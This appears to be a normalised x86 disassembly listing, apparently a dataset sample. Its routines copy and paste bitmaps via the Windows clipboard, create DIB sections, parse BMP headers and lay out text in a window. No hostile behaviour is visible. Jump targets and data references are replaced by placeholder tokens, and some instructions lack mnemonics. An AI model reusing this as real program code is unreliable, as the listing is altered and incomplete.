je r-xdata
push r--data
lea ecx [ ebp - 0x50 ]
push ecx
mov [ ebp - 0x50 ] r--data
call sub_4b5bd2
lea eax [ ebp - 0x24b0 ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
mov edx [ ebp - 0x2488 ]
mov [ esi ] edx
push r--data
lea ecx [ ebp - 0x58 ]
push ecx
mov [ ebp - 0x58 ] r--data
call sub_4b5bd2
lea edx [ ebp - 0x24b0 ]
push edx
call [ rw-data ]
mov eax r-xdata
retn
sub_43e1d0
push 0xffffffff
push sub_4c02e6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4a8
push ebx
push ebp
push esi
push edi
mov esi ecx
xor edi edi
cmp esi edi
mov [ esp + 0x14 ] esi
je r-xdata
mov al [ esp + 0x4c8 ]
test al al
mov [ esp + 0x4c0 ] edi
je r-xdata
cmp [ esi + 0x8 ] edi
jne r-xdata
mov ebp [ esi + 0x20 ]
cmp ebp edi
jne r-xdata
cmp [ esi + 0x458 ] edi
je r-xdata
inc [ esi + 0x8 ]
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
mov edx [ esi + 0x14 ]
mov edi [ esi + 0x10 ]
mov ecx esi
mov [ esp + 0x18 ] edx
call sub_40b280
mov ecx esi
mov ebx eax
call sub_40b2d0
mov ecx [ esi + 0xc ]
mov edx eax
lea eax [ esi + 0x24 ]
dec [ esi + 0x8 ]
jne r-xdata
mov eax [ esi + 0x454 ]
mov edi [ esi + 0x450 ]
mov [ esp + 0x18 ] eax
mov eax [ esi + 0x884 ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx ]
mov edx [ eax + 0x4 ]
mov ebp [ eax + 0x8 ]
mov ebx [ eax + 0x18 ]
mov eax [ eax + 0x1c ]
add ebp ecx
mov ecx [ edx ]
add ebx ecx
mov ecx edx
mov ecx [ ecx ]
lea edx [ eax + ecx ]
mov ecx [ esi + 0x44c ]
lea eax [ esi + 0x45c ]
jmp r-xdata
push eax
call [ LocalLock@IAT ]
mov [ esi + 0x20 ] eax
mov eax [ esp + 0x454 ]
mov cx [ esp + 0x36 ]
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x468 ]
cmp eax 0x10000001
jne r-xdata
lea ecx [ esp + 0x28 ]
call sub_43a1f0
dec [ esi + 0x8 ]
jne r-xdata
cmp [ esi + 0x8 ] edi
jge r-xdata
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
mov [ esp + 0x1c ] ecx
lea ecx [ esp + 0x28 ]
mov [ esp + 0x10 ] eax
call sub_439410
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x10 ]
push 0x0
push 0x0
push eax
push edi
push 0x0
push 0x0
push edx
mov edx [ esp + 0x38 ]
push ebx
push ebp
push ecx
push edx
lea ecx [ esp + 0x54 ]
mov [ esp + 0x4ec ] 0x1
call sub_43ba10
test eax eax
je r-xdata
and eax 0xff
mov [ esp + 0x10 ] eax
movzx edx cx
mov [ esp + 0x10 ] edx
jmp r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jge r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ esi + 0x8 ] edi
push eax
call [ LocalUnlock@IAT ]
mov [ esi + 0x20 ] edi
mov eax [ eax + 0xc ]
movzx eax cx
imul eax [ esp + 0x2c ]
add eax 0x7
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax 0x3
and eax 0xfffffffc
jmp r-xdata
mov eax [ esp + 0x484 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov [ esi + 0x8 ] 0x0
push eax
call [ LocalUnlock@IAT ]
mov [ esi + 0x20 ] 0x0
mov ecx [ esp + 0x4b8 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x4b4
retn 0x4
mov edx [ esp + 0x18 ]
mov [ esp + 0x30 ] edx
mov ecx [ esp + 0x18 ]
neg ecx
mov [ esp + 0x30 ] ecx
jmp r-xdata
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x10 ]
imul eax edi
add eax 0x7
cdq
and edx 0x7
add eax edx
mov ebp eax
mov eax [ esp + 0x30 ]
sar ebp 0x3
add ebp 0x3
and ebp 0xfffffffc
test eax eax
mov [ esp + 0x2c ] edi
jge r-xdata
lea ecx [ esp + 0x28 ]
call sub_43a1f0
lea ecx [ esp + 0x14 ]
call sub_435880
xor eax eax
jmp r-xdata
push ebx
call [ GlobalLock@IAT ]
test eax eax
je r-xdata
mov eax ebp
imul eax [ esp + 0x18 ]
add eax 0x428
push eax
push 0x42
call [ GlobalAlloc@IAT ]
mov ebx eax
test ebx ebx
mov [ esp + 0x20 ] ebx
je r-xdata
push ebx
call [ GlobalFree@IAT ]
lea ecx [ esp + 0x28 ]
call sub_43a1f0
lea ecx [ esp + 0x14 ]
call sub_435880
xor eax eax
jmp r-xdata
mov edi eax
mov ecx 0xa
lea esi [ esp + 0x28 ]
[ edi ] [ esi ]
mov ecx [ esp + 0x10 ]
add eax 0x28
cmp ecx 0x8
jg r-xdata
mov ecx [ esp + 0x18 ]
test ecx ecx
jle r-xdata
mov edx 0x1
shl edx cl
mov edi eax
lea esi [ esp + 0x50 ]
shl edx 0x2
mov ecx edx
mov ebx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov ebx [ esp + 0x20 ]
and ecx 0x3
[ edi ] [ esi ]
add eax edx
push ebx
call [ GlobalUnlock@IAT ]
push 0x0
call [ OpenClipboard@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x24 ]
mov [ esp + 0x10 ] ecx
call [ EmptyClipboard@IAT ]
test eax eax
push ebx
je r-xdata
mov ecx ebp
mov ebx ecx
shr ecx 0x2
mov esi edx
mov edi eax
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x1c ]
mov ecx [ esp + 0x10 ]
add eax ebp
add edx esi
dec ecx
mov [ esp + 0x10 ] ecx
jne r-xdata
mov ebx [ esp + 0x20 ]
call [ GlobalFree@IAT ]
call [ CloseClipboard@IAT ]
push 0x8
call [ SetClipboardData@IAT ]
test eax eax
jne r-xdata
call [ CloseClipboard@IAT ]
lea ecx [ esp + 0x28 ]
call sub_43a1f0
lea ecx [ esp + 0x14 ]
call sub_435880
mov eax 0x1
push ebx
sub_43e520
push ebp
mov ebp ecx
call sub_43d760
mov eax [ esp + 0x8 ]
push 0x8
mov [ ebp ] eax
call [ IsClipboardFormatAvailable@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn 0x4
push 0x0
call [ OpenClipboard@IAT ]
test eax eax
jne r-xdata
push ebx
push esi
push edi
push 0x8
call [ GetClipboardData@IAT ]
push eax
mov [ esp + 0x18 ] eax
call [ GlobalLock@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
call [ CloseClipboard@IAT ]
pop edi
pop esi
pop ebx
xor eax eax
pop ebp
retn 0x4
mov ecx [ ebx + 0x4 ]
mov [ ebp + 0x10 ] ecx
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
mov [ ebp + 0x14 ] eax
lea edi [ ebp + 0x24 ]
mov ecx 0xa
mov esi ebx
[ edi ] [ esi ]
mov ax [ ebx + 0xe ]
cmp ax 0x8
ja r-xdata
movzx edx ax
or edx 0x10000000
mov [ ebp + 0xc ] edx
lea edi [ ebx + 0x28 ]
mov [ ebp + 0xc ] 0x10000001
mov eax [ ebx + 0x20 ]
test eax eax
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
jne r-xdata
mov eax [ edi ]
mov [ ebp + 0x4c ] eax
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x50 ] ecx
mov edx [ edi + 0x8 ]
mov [ ebp + 0x54 ] edx
add edi 0xc
jle r-xdata
mov cl [ ebx + 0xe ]
mov eax 0x1
shl eax cl
test eax eax
push esi
push 0x2
call [ LocalAlloc@IAT ]
test eax eax
mov [ ebp + 0x4 ] eax
jne r-xdata
mov eax [ ebx + 0x8 ]
cdq
mov esi eax
movzx eax [ ebx + 0xe ]
imul eax [ ebx + 0x4 ]
add eax 0x7
xor esi edx
sub esi edx
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax 0x3
and eax 0xfffffffc
imul esi eax
lea edi [ ebx + eax * 4 + 0x28 ]
jmp r-xdata
lea edx [ ebp + 0x4c ]
lea ecx [ ebx + 0x28 ]
mov esi eax
push eax
call [ LocalLock@IAT ]
test eax eax
jne r-xdata
mov ecx ebp
call sub_43d760
mov eax [ esp + 0x14 ]
push eax
call [ GlobalUnlock@IAT ]
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
mov edi [ ecx ]
mov [ edx ] edi
add ecx 0x4
add edx 0x4
dec esi
jne r-xdata
mov ecx esi
mov edx ecx
shr ecx 0x2
mov esi edi
mov edi eax
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x4 ]
push eax
call [ LocalUnlock@IAT ]
mov ecx [ esp + 0x14 ]
push ecx
call [ GlobalUnlock@IAT ]
call [ CloseClipboard@IAT ]
pop edi
pop esi
pop ebx
mov eax 0x1
pop ebp
retn 0x4
mov ecx ebp
call sub_43d760
mov ecx [ esp + 0x14 ]
push ecx
call [ GlobalUnlock@IAT ]
call [ CloseClipboard@IAT ]
pop edi
pop esi
pop ebx
xor eax eax
pop ebp
retn 0x4
sub_43e6c0
push ebx
push ebp
push esi
push edi
mov esi ecx
call sub_43d760
mov eax [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
mov ebp [ esp + 0x1c ]
mov [ esi ] eax
lea ecx [ ebx + ebx * 2 + 0x10 ]
and ecx 0xfffffff0
mov eax 0x55555556
imul ecx
mov ecx edx
push 0x0
shr ecx 0x1f
add edx ecx
push 0x0
mov [ esi + 0x28 ] edx
lea edx [ esi + 0x20 ]
push edx
push 0x0
lea edi [ esi + 0x24 ]
push edi
push 0x0
mov [ edi ] 0x28
mov [ esi + 0x2c ] ebp
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x30 ] 0x1
mov [ esi + 0x32 ] 0x18
call [ CreateDIBSection@IAT ]
test eax eax
mov [ esi + 0x18 ] eax
je r-xdata
mov ecx esi
call sub_43d760
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0xc
push 0x0
call [ CreateCompatibleDC@IAT ]
test eax eax
mov [ esi + 0x1c ] eax
jne r-xdata
mov ecx [ esi + 0x18 ]
push ecx
push eax
call [ SelectObject@IAT ]
pop edi
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebp
mov [ esi + 0xc ] 0x10000018
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0xc
sub_43e770
push ebx
push ebp
push esi
push edi
mov esi ecx
call sub_43d760
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
mov [ esi ] eax
mov eax [ esp + 0x18 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] ecx
lea edx [ esi + 0x24 ]
lea ebp [ eax + 0x7 ]
xor ebx ebx
xor eax eax
push ebx
shr ebp 0x3
mov edi edx
push ebx
add ebp 0x12
mov ecx 0xa
[ edi ]
mov [ edx ] 0x28
and ebp 0xfffffff0
lea eax [ ebp * 8 ]
mov [ edx + 0x4 ] eax
mov ecx [ esi + 0x14 ]
lea edi [ esi + 0x20 ]
push edi
mov eax 0x1
mov [ edx + 0xc ] ax
mov [ edx + 0xe ] ax
mov [ edx + 0x10 ] ebx
push ebx
mov al 0xff
neg ecx
mov [ edx + 0x8 ] ecx
push edx
push ebx
mov [ esi + 0x4e ] bl
mov [ esi + 0x4d ] bl
mov [ esi + 0x4c ] bl
mov [ esi + 0x52 ] al
mov [ esi + 0x51 ] al
mov [ esi + 0x50 ] al
call [ CreateDIBSection@IAT ]
cmp eax ebx
mov [ esi + 0x18 ] eax
jne r-xdata
mov ecx [ esi + 0x14 ]
mov edi [ edi ]
imul ecx ebp
mov edx ecx
shr ecx 0x2
or eax 0xffffffff
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
pop edi
mov [ esi + 0xc ] 0x10000001
pop esi
pop ebp
mov eax 0x1
pop ebx
retn 0xc
mov ecx esi
call sub_43d760
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0xc
sub_43e840
push ebx
push esi
push edi
mov ebx ecx
call sub_43d760
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x444 ]
mov [ ebx + 0x18 ] ecx
mov [ ebx ] eax
mov eax [ esp + 0x448 ]
lea edi [ ebx + 0x24 ]
mov ecx 0x10a
lea esi [ esp + 0x1c ]
[ edi ] [ esi ]
mov ecx [ esp + 0x44c ]
mov [ ebx + 0x10 ] eax
mov eax [ esp + 0x14 ]
mov [ ebx + 0x20 ] edx
mov edx [ esp + 0x450 ]
pop edi
mov [ ebx + 0xc ] eax
pop esi
mov [ ebx + 0x14 ] ecx
mov [ ebx + 0x1c ] edx
mov eax 0x1
pop ebx
retn 0x444
sub_43e8a0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c02f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x1fd0
call sub_4b6180
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
xor edi edi
mov [ eax ] edi
mov eax [ ebp + 0xc ]
or ebx 0xffffffff
cmp eax 0x4
mov [ ebp - 0x4 ] edi
mov [ ecx ] edi
ja r-xdata
mov esi [ ebp + 0x8 ]
jmp [ eax * 4 + jump_table_43eaf8 ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov eax ebx
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
dec [ esi + 0x4 ]
jne r-xdata
push 0x1
call sub_43a9a0
add esp 0x4
test eax eax
je r-xdata
push 0x1
call sub_43aa90
add esp 0x4
test eax eax
je r-xdata
push 0x2
call sub_404aa0
mov esi [ ebp + 0x8 ]
add esp 0x4
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi ]
push 0xe
lea eax [ ebp - 0x20 ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call [ edx + 0x18 ]
cmp [ ebp - 0x20 ] 0x4d42
jne r-xdata
push 0x1
call sub_43a840
mov esi [ ebp + 0x8 ]
add esp 0x4
test eax eax
je r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
lea edx [ ebp - 0x1fe0 ]
xor eax eax
mov ecx 0x6dc
lea edi [ ebp - 0x1fe0 ]
push edx
[ edi ]
call [ rw-data ]
test eax eax
mov esi [ ebp + 0x8 ]
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp esi edi
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x34 ]
push ecx
lea edx [ ebp - 0x470 ]
push edx
push ecx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
mov [ ebp + 0xc ] esp
mov eax esp
je r-xdata
cmp esi edi
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
cmp esi edi
lea ecx [ ebp - 0x20 ]
push ecx
lea edx [ ebp - 0x34 ]
push edx
lea eax [ ebp - 0x470 ]
push eax
push ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp + 0xc ] esp
mov eax esp
je r-xdata
cmp [ ebp - 0x1a ] di
jne r-xdata
cmp esi edi
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x34 ]
push ecx
lea edx [ ebp - 0x470 ]
push edx
push ecx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
mov [ ebp + 0xc ] esp
mov eax esp
je r-xdata
lea edx [ ebp - 0x1fe0 ]
push edx
call [ rw-data ]
xor edi edi
jmp r-xdata
push 0x100
lea eax [ ebp - 0x1fe0 ]
push eax
mov [ ebp - 0x1fc0 ] esi
call [ rw-data ]
test eax eax
jne r-xdata
mov [ eax ] esi
call [ rw-data ]
jmp r-xdata
inc [ esi + 0x4 ]
mov [ eax ] esi
call [ rw-data ]
mov ebx eax
cmp ebx edi
jne r-xdata
inc [ esi + 0x4 ]
cmp [ ebp - 0x18 ] di
jne r-xdata
mov [ eax ] esi
call [ rw-data ]
inc [ esi + 0x4 ]
mov ecx [ ebp - 0x1fb4 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x1fb0 ]
mov [ edx ] ecx
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
xor ebx ebx
mov ebx eax
cmp ebx edi
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x30 ]
mov [ edx ] ecx
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
jmp r-xdata
mov edx [ esi ]
push 0x28
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call [ edx + 0x18 ]
mov ecx [ ebp - 0x44 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x40 ]
mov [ edx ] ecx
mov ecx [ ebp + 0x14 ]
cdq
xor eax edx
xor ebx ebx
sub eax edx
mov [ ecx ] eax
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp - 0x30 ]
mov [ ecx ] eax
mov eax [ ebp + 0x14 ]
mov [ eax ] edx
jmp r-xdata
sub_43eb10
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0310
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x2c74
call sub_4b6180
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push eax
call sub_439280
add esp 0x4
dec eax
mov [ ebp - 0x2c84 ] 0x0
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push 0x1
call sub_43a9a0
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov ecx 0x6dc
lea edi [ ebp - 0x1c84 ]
[ edi ]
lea ecx [ ebp - 0x1c84 ]
xor esi esi
push ecx
mov [ ebp - 0x4 ] esi
call [ rw-data ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov [ ebp - 0x1c60 ] eax
call [ LocalSize@IAT ]
mov edx [ ebp - 0x1c64 ]
mov ecx [ ebp - 0x1c60 ]
mov [ ebp - 0x1bf0 ] edx
lea edx [ ebp - 0x2c84 ]
mov [ ebp - 0x124 ] edx
lea edx [ eax + ecx ]
mov [ ebp - 0x1c5c ] eax
mov [ ebp - 0x1be8 ] eax
mov [ ebp - 0x171c ] eax
mov [ ebp - 0x1720 ] eax
push 0x1
lea eax [ ebp - 0x1c84 ]
push eax
mov [ ebp - 0x1c84 ] 0x1
mov [ ebp - 0x1bec ] ecx
mov [ ebp - 0x120 ] 0xfff
mov [ ebp - 0x172c ] ecx
mov [ ebp - 0x1728 ] edx
mov [ ebp - 0x1730 ] ecx
call [ rw-data ]
cmp eax esi
je r-xdata
push r--data
lea edx [ ebp - 0x14 ]
push edx
mov [ ebp - 0x14 ] r--data
call sub_4b5bd2
mov eax [ ebp - 0x1bd8 ]
cmp eax 0x1
jne r-xdata
lea ecx [ ebp - 0x1c84 ]
push ecx
call [ rw-data ]
cmp eax 0x2
jne r-xdata
push r--data
jmp r-xdata
cmp eax 0x3
jne r-xdata
push r--data
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov ecx edi
call sub_402010
push r--data
mov ecx edi
call sub_402010
mov ebx [ wsprintfA@IAT ]
jmp r-xdata
cmp eax 0x4
jne r-xdata
push r--data
jmp r-xdata
lea eax [ ebp - 0x1c30 ]
cmp esi [ eax + 0x4d8 ]
jge r-xdata
cmp eax 0x5
jne r-xdata
push r--data
jmp r-xdata
mov ecx [ eax + 0x1ae8 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x4e4 ]
mov edx esi
shl edx 0x4
lea ecx [ eax + edx ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
cmp eax ecx
jne r-xdata
cmp eax 0x6
jne r-xdata
push r--data
jmp r-xdata
mov al [ ebp - 0x2c84 ]
test al al
je r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
push ecx
push eax
lea eax [ ebp - 0x114 ]
push r--data
push eax
call ebx
add esp 0x10
mov ecx eax
imul ecx eax
push ecx
lea edx [ ebp - 0x114 ]
push r--data
push edx
call ebx
add esp 0xc
jmp r-xdata
push r--data
push r--data
jmp r-xdata
lea ecx [ ebp - 0x1c84 ]
push ecx
call [ rw-data ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov eax 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lea eax [ ebp - 0x1c30 ]
movzx edx [ eax + 0x1b10 ]
mov eax r--data
mov [ ebp + edx - 0x2c84 ] 0x0
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx edi
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
nop
lea eax [ ebp - 0x114 ]
lea edx [ eax + 0x1 ]
mov eax r--data
lea edx [ eax + 0x1 ]
test esi esi
jle r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx edi
call sub_401cc0
lea eax [ ebp - 0x2c84 ]
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx edi
call sub_401cc0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x114 ]
push ecx
mov ecx edi
call sub_401cc0
inc esi
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx edi
call sub_401cc0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x2c84 ]
push eax
mov ecx edi
call sub_401cc0
sub_43ee40
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x84
mov eax [ ecx + 0xd3c ]
test eax eax
push ebx
push esi
lea esi [ ecx + 0xd38 ]
push edi
mov [ esp + 0x10 ] ecx
je r-xdata
mov ebx [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
lea eax [ esp + 0x80 ]
push eax
push ebx
call [ GetWindowRect@IAT ]
mov esi [ rw-data ]
mov ecx esi
imul ecx [ rw-data ]
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
mov ecx [ rw-data ]
imul ecx esi
mov edi edx
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x1c ] edi
mov [ esp + 0x40 ] edx
jne r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
cdq
sub eax edx
sar eax 0x1
lea ecx [ eax - 0x1 ]
imul eax esi
imul ecx edi
sub eax ecx
mov [ esp + 0x2c ] eax
xor edi edi
mov eax [ rw-data ]
xor edi edi
cmp eax edi
jne r-xdata
mov eax [ esp + 0x10 ]
mov edx [ eax + 0xd30 ]
mov [ esp + 0x14 ] edx
cmp [ rw-data ] edi
jne r-xdata
mov edx [ rw-data ]
imul edx ecx
mov eax 0x51eb851f
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x30 ] edx
mov esi [ esp + 0x8c ]
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov eax [ esp + 0x84 ]
mov esi [ esp + 0x88 ]
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov eax [ esp + 0x80 ]
jmp r-xdata
mov ebx [ esp + 0x10 ]
push 0x0
push ecx
mov ecx ebx
call sub_43a020
mov edx [ rw-data ]
push 0x1
mov esi eax
push edx
mov ecx ebx
mov [ esp + 0x70 ] esi
call sub_43a020
mov [ esp + 0x6c ] eax
mov eax [ esp + 0x18 ]
push esi
push eax
mov [ esp + 0x28 ] 0x0
call [ SelectObject@IAT ]
mov [ esp + 0x5c ] eax
xor esi esi
push edi
push ecx
mov ecx eax
call sub_43a020
push eax
push esi
mov [ esp + 0x5c ] eax
call [ SelectObject@IAT ]
mov [ esp + 0x50 ] eax
xor ebx ebx
push ebx
call [ GetDC@IAT ]
mov ecx [ rw-data ]
mov esi eax
cmp [ rw-data ] edi
mov [ esp + 0x18 ] esi
mov [ esp + 0x60 ] edi
mov [ esp + 0x64 ] edi
mov [ esp + 0x34 ] edi
mov [ esp + 0x20 ] edi
mov [ esp + 0x28 ] ecx
mov [ esp + 0x30 ] edi
je r-xdata
push 0x2
call [ GetSystemMetrics@IAT ]
sub esi eax
mov [ esp + 0x2c ] esi
jmp r-xdata
sub esi edx
sub esi ecx
sub esi eax
cmp [ rw-data ] edi
mov [ esp + 0x2c ] esi
je r-xdata
mov ebx [ esp + 0x10 ]
cmp al 0xa
je r-xdata
mov esi [ esp + 0x10 ]
cmp al 0xa
je r-xdata
mov edx [ edi + 0x8 ]
sub edx ecx
sar edx 0x3
xor edx edx
jmp r-xdata
mov ebx [ esp + 0x10 ]
cmp esi [ ebx + 0xd34 ]
je r-xdata
mov edx [ edi + 0x8 ]
sub edx ecx
sar edx 0x3
xor edx edx
jmp r-xdata
mov esi [ esp + 0x10 ]
cmp ebx [ esi + 0xd34 ]
je r-xdata
mov eax [ edi + 0x8 ]
lea edx [ esp + 0x60 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx edi
call sub_43a340
mov eax [ edi + 0xc ]
sub eax ecx
sar eax 0x3
cmp edx eax
jae r-xdata
test ecx ecx
je r-xdata
mov ecx [ esp + 0x60 ]
mov edx esi
sub edx ecx
mov ecx [ ebx + 0xd3c ]
test ecx ecx
lea edi [ ebx + 0xd38 ]
mov [ esp + 0x64 ] edx
jne r-xdata
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
mov eax [ edi + 0x8 ]
lea ecx [ esp + 0x60 ]
push ecx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx edi
call sub_43a340
mov eax [ edi + 0xc ]
sub eax ecx
sar eax 0x3
cmp edx eax
jae r-xdata
test ecx ecx
je r-xdata
mov edx [ esp + 0x60 ]
mov ecx ebx
sub ecx edx
lea edi [ esi + 0xd38 ]
mov [ esp + 0x64 ] ecx
mov ecx [ edi + 0x4 ]
test ecx ecx
jne r-xdata
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
mov edi [ esp + 0x34 ]
mov edi [ edi + 0x8 ]
sub edi eax
sar edi 0x3
cmp edi 0x1
jbe r-xdata
mov eax [ esp + 0x5c ]
mov ebx [ edi + 0x8 ]
push eax
push edi
lea ecx [ esp + 0x68 ]
push ecx
push 0x1
push ebx
call sub_4607a0
add esp 0x14
add ebx 0x8
mov [ edi + 0x8 ] ebx
mov ebx [ esp + 0x10 ]
jmp r-xdata
mov [ esp + 0x38 ] 0x1
xor ebx ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov edi [ esp + 0x20 ]
mov edi [ edi + 0x8 ]
sub edi eax
sar edi 0x3
cmp edi 0x1
jbe r-xdata
mov edx [ esp + 0x5c ]
mov esi [ edi + 0x8 ]
push edx
push edi
lea eax [ esp + 0x68 ]
push eax
push 0x1
push esi
call sub_4607a0
add esp 0x14
add esi 0x8
mov [ edi + 0x8 ] esi
mov esi [ esp + 0x10 ]
jmp r-xdata
mov ecx 0x1
mov edx [ rw-data ]
test edx edx
je r-xdata
mov edx [ esp + 0x5c ]
mov eax [ esp + 0x18 ]
push edx
push eax
call [ SelectObject@IAT ]
mov ecx [ esp + 0x68 ]
mov esi [ DeleteObject@IAT ]
push ecx
call esi
mov edx [ esp + 0x6c ]
push edx
call esi
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov esi [ esp + 0x2c ]
add ecx eax
add ecx edi
mov [ ebx + 0x10 ] ecx
mov edx [ rw-data ]
mov eax [ rw-data ]
add eax edx
mov edx [ esp + 0x80 ]
add eax esi
mov [ ebx + 0x14 ] eax
mov eax [ esp + 0x88 ]
sub eax edx
cmp ecx eax
jge r-xdata
mov eax [ esp + 0x14 ]
cmp [ esi + eax ] 0xd
jne r-xdata
mov edi [ esp + 0x34 ]
add edi [ esp + 0x40 ]
jmp r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
lea eax [ esi + ecx ]
cmp [ eax ] 0x9
jne r-xdata
mov edx [ esp + ebx * 4 + 0x68 ]
mov eax [ esp + 0x18 ]
push edx
push eax
mov [ esp + 0x28 ] ebx
call [ SelectObject@IAT ]
mov [ esp + 0x38 ] 0x2
mov ebx 0x1
jmp r-xdata
cmp al 0x81
jne r-xdata
mov ecx [ esp + 0x50 ]
mov edx [ esp + 0x18 ]
push ecx
push edx
call [ SelectObject@IAT ]
mov eax [ esp + 0x54 ]
push eax
call [ DeleteObject@IAT ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov ebx [ esp + 0x2c ]
add edx ecx
add edx ebx
